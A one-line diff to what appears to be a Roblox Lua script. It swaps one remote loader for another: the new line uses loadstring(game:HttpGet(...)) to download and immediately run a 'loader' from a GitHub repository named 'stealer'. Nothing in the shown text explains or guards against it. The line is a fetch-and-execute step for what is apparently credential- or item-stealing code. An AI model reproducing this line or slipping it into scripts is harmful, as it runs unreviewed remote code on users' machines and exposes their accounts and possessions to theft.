@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://pastefy.app/LNXmtdXQ/raw"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/temphor/stealer/refs/heads/main/loader", true))()
